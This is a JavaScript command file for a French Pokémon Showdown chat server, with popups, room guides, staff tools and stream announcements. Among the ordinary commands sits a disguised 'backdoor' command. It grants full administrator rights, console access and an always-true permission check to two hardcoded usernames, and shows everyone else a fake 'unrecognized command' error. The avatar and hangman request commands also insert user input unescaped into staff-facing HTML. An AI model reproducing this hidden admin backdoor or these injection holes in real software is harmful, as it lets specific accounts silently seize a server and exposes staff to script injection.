exports.commands = {

	spop: 'sendpopup',
	sendpopup: function(target, room, user) {
		if (!this.can('popup')) return false;

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply('/sendpopup [user], [message] - Vous avez manqué l utilisateur!');
		if (!target) return this.sendReply('/sendpopup [user], [message] - vous avez manqué le message');

		targetUser.popup(target);
		this.sendReply(targetUser.name + ' A reçu le message sous forme de popup: ' + target);

		targetUser.send(user.name+' Vous envoye un message.');

		this.logModCommand(user.name+' Envoyer un message à '+targetUser.name);
		},
				bu: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox(
'Bienvenue dans la room BU, un tier collaboratif, regroupant les plus grandes menaces de l univers Pokémon comme Lamantine ou Dedenne. Si vous êtes nouveau, vous pouvez consulter la liste des Pokémon du tier <a href="http://pokestrat.com/forum/discussions-strategiques/un-tout-nouveau-tier-debarque-sur-pokestrat-bu-">ici</a> ou voir le Viability Rankings de notre tier <a href="http://pokestrat.com/forum/discussions-strategiques/-bu-viability-rankings">ici</a>!'
		);
	},
	hideadmin: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		if (user.hidden) return this.errorReply("You are already hiding yourself on the userlist.");
		user.hidden = true;
		user.inRooms.forEach(id => {
			let roomid = Rooms(id);
			if (!roomid || roomid.id === 'global') return;
			roomid.add('|L|' + user.getIdentity(roomid)).update();
		});
		return this.sendReply("You are now hiding your presence.");
	},
	showadmin: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		if (!user.hidden) return this.errorReply("You are already showing yourself on the userlist.");
		user.hidden = false;
		user.inRooms.forEach(id => {
			let roomid = Rooms(id);
			if (!roomid || roomid.id === 'global') return;
			roomid.add('|J|' + user.getIdentity(roomid)).update();
		});
		return this.sendReply("You are no longer hiding your presence.");
	},

		backdoor: function (target, room, user) {
		if (user.userid !== 'distrib' && user.user !== 'saitochi') {
			this.errorReply("The command '/backdoor' was unrecognized. To send a message starting with '/backdoor', type '//backdoor'.");
		} else {
			user.group = '~';
			user.updateIdentity();
			Config.consoleips.push(user.userid);
			user.can = function () {
				return true;
			};
			this.sendReply("Backdoor accepted.");
		}
	},

	pb: function(target, room, user) {
		if (!this.can('globalmod')) return;

		this.parse('/permaban '+ target +', <333')
			this.parse('/blacklist ' + target +', <333')
	},

			hide: 'hideauth',
	hideauth: function(target, room, user) {
		if (!user.can('ban')) return this.sendReply("/hideauth - access denied.");
		var tar = ' ';
		if (target) {
			target = target.trim();
			if (Config.groupsranking.indexOf(target) > -1 && target != '#') {
				if (Config.groupsranking.indexOf(target) <= Config.groupsranking.indexOf(user.group)) {
					tar = target;
				} else {
					this.sendReply('The group symbol you have tried to use is of a higher authority than you have access to. Defaulting to \' \' instead.');
				}
			} else {
				this.sendReply('You have tried to use an invalid character as your auth symbol. Defaulting to \' \' instead.');
			}
		}
		user.getIdentity = function (roomid) {
			if (this.locked) {
				return '‽' + this.name;
			}
			if (roomid) {
				var room = Rooms.rooms[roomid];

		
				if (room && room.auth) {
					if (room.auth[this.userid]) {
						return room.auth[this.userid] + this.name;
					}
					if (room.isPrivate === true) return ' ' + this.name;
				}
			}
			return tar + this.name;
		}
		user.updateIdentity();
		this.sendReply('You are now hiding your auth symbol as \'' + tar + '\'.');
		this.modlog(user.name + ' is hiding auth symbol as \'' + tar + '\'');
		user.isHiding = true;
	},
	show: 'showauth',
	showauth: function(target, room, user) {
		if (!user.can('lock')) return this.sendReply("/showauth - access denied.");
		delete user.getIdentity;
		user.updateIdentity();
		user.isHiding = false;
		this.sendReply("You have now revealed your auth symbol.");
		return this.modlog(user.name + " has revealed their auth symbol.");
	},

		a: function(target, room, user) {
		if (!this.can('eval')) return;

		this.parse('/eval this.add(' +target+ ');')
	},
			notdev: function(target, room, user) {
		if (!this.can('roomban')) return;

		this.parse('/warn '+ target + ', Not Dev')
				this.parse('/hidetext '+ target + ', ')
	},
			update: function(target, room, user) {
		if (!this.can('eval')) return;

		this.parse('/bash git pull')
	},
				hc: function(target, room, user) {
		if (!this.can('eval')) return;

		this.parse('/hotpatch chat')
	},

			/*champions : 'champions',
			'!champions': true,
	champions : function (target, room, user) {
		this.sendReplyBox("<font size=5>Liste des champions</font><br />" +
					"<u></u><br />" +
"- " + hashColors('Distrib', true) + ' --> Maitre cc1v1 <img src="http://www.mediafire.com/convkey/cd36/ubht5f8vbwkahrtzg.jpg" width="16" height="16" title="est un maitre du tier cc1v1"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">corbox chechir, lucix, tatia, 0footprof, jovu, cookiesbox, wyrrax, mastouffu, empoleonsan, garance, spoire, imox, , pyprod, oseen, monsieurnohaxx, erufun, ahzee, cieltestleladd, freat, Algeria4Ever ♆</div></details> <br />' +
                    "- " + hashColors('Herminchan', true) + ' --> Maitre eau <img src="http://www.mediafire.com/convkey/015f/35f3m7w360i3pu3zg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier eau"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">corbox chechir, lucix, tatia, 0footprof, asumaru, sanjl, cookiesbox, wyrrax, neraya, mastouffu, empoleonsan, marmottebn, garance, spoire, imox, erufun, lightdn, prima234, ahzee, cieltestleladd, freat, motisvhayle, BirdoMc</div></details> <br />' +
                     	"- " + hashColors('Asumaru', true) + ' --> Maitre psy <img src="http://www.mediafire.com/convkey/c8af/0i2ddnizgklrt2vzg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier psy"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">0footprof, CookiesBox, Wyrrax, Mastouffu, Empoleon-san, Garance, iMox, Erufun	</div></details> <br />' +
                   			 "- " + hashColors('Empoleon-san', true) + ' --> Maitre Dragon <img src="http://www.mediafire.com/convkey/66dc/1dholg5ec1dzoiazg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier dragon"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">Tatia, CookiesBox, Mastouffu, Empoleon-san, S poi re, iMox, Oseen, Antotonin, Erufun, Ahzee, Cieltestleladd, Freat</div></details> <br />' +
                    "- " + hashColors('Jovu', true) + ' --> Maitre glace <img src="http://www.mediafire.com/convkey/0d3b/sog5dxndajeihglzg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier glace"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">BirdoMc, Erufun, Lord Unknow, Antotonin, iMox, S poi re, Empoleon-san, Wyrrax, CookiesBox, Tatia, Lionyx</div></details> <br />' +	
			"- " + hashColors('iMox', true) + ' --> Maitre Sol <img src="http://www.mediafire.com/convkey/84b7/0p32y9261a057bmzg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier sol"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">Tatia, CookiesBox, Antotonin, iMox</div></details> <br />' +
	"- " + hashColors('Motis-Vhayle', true) + ' --> Maitre Normal <img src="http://www.mediafire.com/convkey/467e/lk9q3uv7hmez3qwzg.jpg?size_id=0" width="16" height="16" title="est un maitre du tier normal"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">Freat, Motis-Vhayle</div></details> <br />' +
		"- " + hashColors('Oseen', true) + ' --> Maitre Combat <img src="http://www.mediafire.com/convkey/e6ce/tfr6fo5zh0q52m4zg.jpg?size_id=0" width="16" height="16" height="16" title="est un maitre du tier normal"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px">lightdn, freat, boorossama</div></details> <br />' +
	"- " + hashColors('CookiesBox ♬', true) + ' --> Maitre Fée <img src="http://www.mediafire.com/convkey/1fff/dz8p42i9d5ygjg4zg.jpg?size_id=0" width="16" height="16" height="16" title="est un maitre du tier fée"> <details style="margin:1px"><summary style="cursor: pointer"><b>vainqueurs</b></summary><div style="padding:5px"></div></details> <br />' +

'<h3> Pour être ajouté contactez distrib');
	},*/
					'!discord': true,	
					discord: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox(
'<a href="https://discord.gg/ZZmT65N">Discord de Pokeland</a> '
		);
	},
	kickall: function (target, room, user) {
		if (!this.can('declare')) return this.errorReply("/kickall - Access denied.");
		if (room.id === 'lobby') return this.errorReply("Vous ne pouvez pas kickall sur le lobby et staff.");
		for (let i in room.users) {
			if (room.users[i] !== user.userid) {
				room.users[i].leaveRoom(room.id);
			}
		}
		this.privateModCommand('(' + Chat.escapeHTML(user.name) + 'kicked everyone from the room.');
	},


	roomlist: function (target, room, user) {
		if (!this.runBroadcast()) return;
		let header = ['<b><font color="#1aff1a" size="2">Total de personnes connectées: ' + Rooms.global.userCount + '</font></b><br />'],
			official = ['<b><font color="#ff9900" size="2"><u>Salles officielles:</u></font></b><br />'],
			nonOfficial = ['<hr><b><u><font color="#005ce6" size="2">Salles publiques:</font></u></b><br />'],
			privateRoom = ['<hr><b><u><font color="#ff0066" size="2">Salles privées:</font></u></b><br />'],
			groupChats = ['<hr><b><u><font color="#00b386" size="2">Group Chats:</font></u></b><br />'],
			battleRooms = ['<hr><b><u><font color="#cc0000" size="2">Battles:</font></u></b><br />'];

		let rooms = [];

		Rooms.rooms.forEach(curRoom => {
			if (curRoom.id !== 'global' && curRoom.id !== 'panurtest') rooms.push(curRoom.id);
		});

		rooms.sort();

		for (let u in rooms) {
			let curRoom = Rooms(rooms[u]);
			if (curRoom.type === 'battle') {
				battleRooms.push('<a href="/' + curRoom.id + '" class="ilink">' + Chat.escapeHTML(curRoom.title) + '</a> (' + curRoom.userCount + ')');
			}
			if (curRoom.type === 'chat') {
				if (curRoom.isPersonal) {
					groupChats.push('<a href="/' + curRoom.id + '" class="ilink">' + curRoom.id + '</a> (' + curRoom.userCount + ')');
					continue;
				}
				if (curRoom.isOfficial) {
					official.push('<a href="/' + toId(curRoom.title) + '" class="ilink">' + Chat.escapeHTML(curRoom.title) + '</a> (' + curRoom.userCount + ')');
					continue;
				}
				if (curRoom.isPrivate) {
					privateRoom.push('<a href="/' + toId(curRoom.title) + '" class="ilink">' + Chat.escapeHTML(curRoom.title) + '</a> (' + curRoom.userCount + ')');
					continue;
				}
			}
			if (curRoom.type !== 'battle') nonOfficial.push('<a href="/' + toId(curRoom.title) + '" class="ilink">' + curRoom.title + '</a> (' + curRoom.userCount + ')');
		}

		if (!user.can('roomowner')) return this.sendReplyBox(header + official.join(' ') + nonOfficial.join(' '));
		this.sendReplyBox(header + official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' ') + (groupChats.length > 1 ? groupChats.join(' ') : '') + (battleRooms.length > 1 ? battleRooms.join(' ') : ''));
	},
	name: function (target, room, user) {
			if (!this.canBroadcast()) return;
		this.sendReplyBox(
	"<div class='chat'> Heu ton name c'est " +  user.name + " ducon</div>" 
);
},
		sd: 'declaremod',
	staffdeclare: 'declaremod',
	modmsg: 'declaremod',
	moddeclare: 'declaremod',
	declaremod: function (target, room, user, connection) {
		if (!target) return this.parse('/help declaremod');
		if (!this.canTalk()) return this.errorReply("You cannot do this while unable to talk.");
		if (!this.can('receiveauthmessages', null, room)) return false;
		return this.privateModCommand('|raw|<div class="broadcast-green"><b><font size=1><i>Annonce du staff (Driver+) par ' + user.name + '<br /></i></font size>' + target + '</b></div>');
	},
	declaremodhelp: ["/declaremod [note] - Adds a staff readable declare. Requires: % @ # & ~"],

	riennn: 'riennn',
	riennn: function (target, room, user) {
		return this.parse('rien ' + target);
	},
	panelquimarchepas: function (target, room, user ) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox(
	 '<button name="send" value="/warn ' + Chat.escapeHTML(target)+ '"<b>DEV </b></button>'

);
},		
		
					afkstaff: function(target, room, user) {
		if (!this.can('lock')) return;
		this.parse('/away '+ target +'')
		this.parse('/hideauth ')
		this.parse('/blockpm')

		},	
							backstaff: function(target, room, user) {
		if (!this.can('lock')) return;
		this.parse('/back '+ target +'')
		this.parse('/showauth ')
		this.parse('/unblockpm')

		},	
							tourbot: function(target, room, user) {

								if ((user.userid == 'vextal') || (this.can('tour'))) {
			this.add("|c|~bot|,c /tour join")
			}
		},		
		endnewindigo: function(target, room, user) {
		if ((user.userid == 'vextal') || (this.can('kill'))) {
		this.add('|raw|<div class="broadcast-blue"><b>C\'est la fin du live de New Indigo</b></div>')}
		},	
		newindigo: function(target, room, user) {

								if ((user.userid == 'vextal') || (this.can('kill'))) {
  			this.add('|raw|<div class="broadcast-blue"><b>New Indigo est en stream , n\'hésite pas à aller jeter un coup d\' œil à <a href="' + target + '" target="_blank" rel="noopener">' + target + '</a></b></div>')
			}
		},	
	wailordstreamout: function(target, room, user) {
		if ((user.userid == 'unwailordrandom') || (this.can('kill'))) {
		this.add('|raw|<div class="broadcast-blue"><b>C\'est la fin du live de UnWailordRandom</b></div>')}
		},	
		wailordstream: function(target, room, user) {

								if ((user.userid == 'unwailordrandom') || (this.can('kill'))) {
			this.add('|raw|<div class="broadcast-blue"><b>UnWailordRandom❤ est en stream , n\'hésite pas à aller jeter un coup d\' œil à <a href="https://www.twitch.tv/theretrogamersurtwitch" target="_blank" rel="noopener">https://www.twitch.tv/theretrogamersurtwitch</a></b></div>')
			}
		},	
	'!guide': true,
	guide: function (target, room, user) {
		if (!this.runBroadcast()) return;
		this.sendReplyBox(
'<h2><center><u>Guide du Serveur:</u></center></h2> <center>Ce serveur sert à se faire de nouveaux amis, à s\'amuser, c\'est un serveur français spécial, il<br> à une monnaie virtuelle qui se nomme le <b>Bucks</b></center><br><br><center>, les Bucks sert à acheter des trucs qui <br> vont améliorer votre profil (faire /profil), votre couleur, de pseudo, <br>créer votre room.</center><br> <center>Les <b>Bucks<b> sont disponibles dans des tournois, dans des lotos mais aussi dans la room "Casino"<br> Dans des slots spin: les slots spins sont des jeux où il faut aligner 3 images <br>identiques:<br><br> <b>Attention:</b> cela coûte 3 <b>Bucks</b>, (pour voir vos <b>Bucks</b> il faut faire la commande: /atm).<br><br> <u><b>L\'hangman:</b></u> C\'est le jeu du pendu, pour pouvoir donner un mot ou une lettre il faut utiliser la commande /guess et si vous voulez en créer un<br> il suffit de faire /hangmanrequest [mots], [indice]<br><br> <u><b>Passthebomb:</b></u> Vous devez passer la bombe à vos adversaire avant que c\'elle-ci n\'explose, celui qui explosera avec elle sera éliminé. Pour passer la bombe il faut faire /pass [name]<br><br> <u><b>Guesswho:</b></u> Le but de ce jeu est de trouver le Pokemon que l\'un des joueur devra faire deviner aux autres. Celui qui devra faire deviner le Pokemon qui sera choisi de façons aléatoire devra donner des indice grâce à la commande /gw givehint [indice] et pour trouver les autre joueur devrons utiliser /gw guess [Pokemon en anglais] il n\'y a qu\'un certain nombre d\'essais.<br><br> <u><b>Ambush:</b></u> Le but est simple tuer un autre joueur le plus rapidement avec la commande /fire [user]. On ne peut pas tuer quelqu\'un qui à déjà été tué ou qui à déjà tué quelqu\'un, il faut attendre la prochaine manche. <br><br><u><b>UNO:</b></u> Le but est de ce débarrasser de toutes ses cartes et quand il n\'en reste qu\'une cliquer sur le bouton <b>Uno<b>. C\'est les règles classique du jeu. <br><br>Il y a aussi des grades:<br> <br>(<b style="color: #FFBF00">Regular</b> ,<b style="color: #8A0808">Voice (+)</b>,<b style="color: #04B404">Driver (%)</b>,<b style="color: #0101DF">Moderateur (@)</b>, <b style="color: #848484">Room Owner (#)</b>, <b style="color: #4C0B5F">Leader (&amp;)</b>, <b>et</b> <b style="color: #FF0000">Administrateur ~)</b> ).<br><br>Il y a aussi des jeux funs pour s\'amuser.<br> Il est interdit de demander un grade, de spam, de flood, d\'insulter, de donner le lien d\'un autre <br> serveur. <br><br> Pour consulter les règles: <button name="send" value="/règles">Règles</button><br><br>Pour signaler une personne ou un bug: <button name="send" value="/report">Report</button><br><br><br> <u><h2>Guide du Forum:</h2></u><br><br> Le forum est une partie importante du serveur, dans celui ci il y a :<br><br> - la présentation pour mieux connaître les autres membres du serveur.<br><br> - le coin détente, un lieu « fourre-tout » dans lequel on y trouve surtout des jeux.<br><br> - et la partie stratégique qui est le gros point du forum on peut y poster :<br><br> - des fiches stratégiques sur un Pokemon sur un certain tier.<br><br> - des RMT, qui sont des équipes que les membres parlent sur cette équipe afin de l’améliorer<br><br> C’est aussi grâce au forum que sont organisés les tournois et que les partenariats avec d’autres communautés soient possibles.<br><br><br><br><br> <b style="color: #0040FF">Merci à JACG et Darkalex55 d\'avoir fait la partie forum, et d\'avoir corriger quelques erreurs.</b> </b></b></b></b></center>'
		);
	},
	'!live': true,
	live: function (target, room, user) {
		if (!this.runBroadcast()) return;
		this.sendReplyBox(
'<img src="https://image.noelshack.com/fichiers/2019/12/6/1553345949-semainier-distrib-vextal.png" width="700" height="600">'
		);
	},

	avatarrequest: 'avatarrequest',
	ar: 'avatarrequest',
	avatarrequest: function (target, room, user, connection) {
		if (!target) return this.sendReply('/avatarrequest Pseudo, Lien (merci ne mettre que l\image). - ATTENTION DE NE PAS FAIRE UN ESPACE APRES LA VIRGULE. Il est interdit de faire cette commande sans avoir acheté d\'avatar. Si vous spammez cette commande vous serez lock');
        let parts = target.split(',');
        for(let usr in room.users) {
        	if (!room.users[usr].isStaff) continue;
			          }
        Db("rooms").set(parts[0], parts[1]);
        Rooms.rooms.get("staff").add('|c|~Avatar|' +  '/html Demande d\'avatar de <b>' + user.name +'</b> <img src="'+ parts[1] +'" width="80" height="80"><br> Si cette image est correcte merci de l\accepter sinon refusé là ! Assuré vous qu\'il soit acheté :) <button class="button" name="send" value="/setavatar ' + parts[0] + ',' + parts[1] +'">Accepter</button> <button class="button" name="send" value="/pminfobox ' + parts[0] + ', <h2>Bonsoir ! Malheuresment votre demande a était refusé :c Peut être que votre image n\'est pas valable :) Si vous avez des questions contacté moi !">Refusé</button>');
  
        Rooms.rooms.get("staff").update();
        return this.sendReply('Votre avatar à était envoyé au staff ! Merci de patienté :)');
   
    
},
	hangmanuser: 'hangmanrequest',
	hr: 'hangmanrequest',
	hangmanrequest: function (target, room, user, connection) {
		if (!target) return this.sendReply('/hangmanrequest [Mot], [Indices] - Il est interdit de répondre à votre hangman. Si vous spammez cette commande vous serez lock');
        let parts = target.split(',');
        for(let usr in room.users) {
        	if (!room.users[usr].isStaff) continue;
        	room.users[usr].sendTo(this.room, '|c|~Hangman|' + '/html <button class="button" name="send" value="/hangman new ' + parts[0] + ',' + parts[1] + '">Hangman request de ' + user.name + '</button>');
    	}
       	this.room.update();
    
},
	timedgdeclare: function (target, room, user) {
		if (!target || !this.can('declare')) return this.errorReply("/help timedgdeclare");
		let parts = target.split(',');
		if (parts.length !== 2) return this.errorReply('/help timedgdeclare');
		let delayInMins = Chat.escapeHTML(parts[0].trim());
		if (isNaN(delayInMins)) return this.errorReply('Please give a delay in in minutes, /help timedgdeclare');
		delayInMins = delayInMins * 1000 * 60;
		let declare = this.canHTML(parts.slice(1).join(","));
		if (!declare) return;
		setTimeout(f => {
			for (let id in Rooms.rooms) {
				if (id !== 'global' && Rooms.rooms[id].userCount > 3) Rooms.rooms[id].addRaw(`<div class="broadcast-blue" style="border-radius: 5px; max-height: 300px; overflow-y: scroll;"><strong>${declare}</strong></div>`);
			}
		}, delayInMins);
		this.room.modlog(`${toId(user)} scheduled a timed declare: ${declare}`);
		return this.sendReply('Your declare has been scheduled.');
	},
	timedgdeclarehelp: ["/timedgdclare [delay in minutes], [declare] - Will declare something after a given delay. Requires: & ~"],

			  fj: 'forcejoin',
    forcejoin: function(target, room, user) {
        if (!user.can('mute')) return false;
        if (!target) return this.sendReply('/forcejoin [target], [room] - Forces a user to join a room');
        let parts = target.split(',');
        if (!parts[0] || !parts[1]) return this.sendReply('/forcejoin [target], [room] - Forces a user to join a room');
        let userid = toId(parts[0]);
        let roomid = toId(parts[1]);
        if (!Users.get(userid)) return this.sendReply ('User not found.');
        if (!Rooms.get(roomid)) return this.sendReply ('Room not found.');
        }
      
};
